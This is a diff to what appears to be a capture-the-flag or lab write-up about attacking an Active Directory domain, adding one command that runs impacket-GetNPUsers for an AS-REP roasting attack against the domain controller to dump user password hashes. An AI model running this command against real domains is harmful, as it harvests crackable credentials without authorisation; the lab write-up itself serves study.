@@ -112,6 +112,9 @@ I copied them to the `usernames.txt` and then I run `kerbrute` again:
 ![](attachments/Pasted%20image%2020251223204054.png)
 
 Then I checked for AsrepRoasting attack and I was able to find a hash:
+```bash
+impacket-GetNPUsers fusion.corp/ -dc-ip $target -usersfile usernames.txt -outputfile hashes.txt
+```
 
 ![](attachments/Pasted%20image%2020251223204712.png)
 
